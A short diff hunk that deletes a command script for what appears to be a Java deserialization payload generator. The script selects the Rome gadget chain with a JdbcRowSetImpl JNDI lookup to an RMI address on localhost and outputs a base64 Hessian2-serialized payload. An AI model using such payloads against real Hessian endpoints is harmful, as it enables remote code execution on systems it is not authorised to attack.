@@ -1,7 +1,0 @@
-use payload Rome
-use bullet JdbcRowSetImplBullet
-set jndiURL rmi://localhost:1099/test
-set encoder base64
-set output console
-set serializeType hessian2
-run
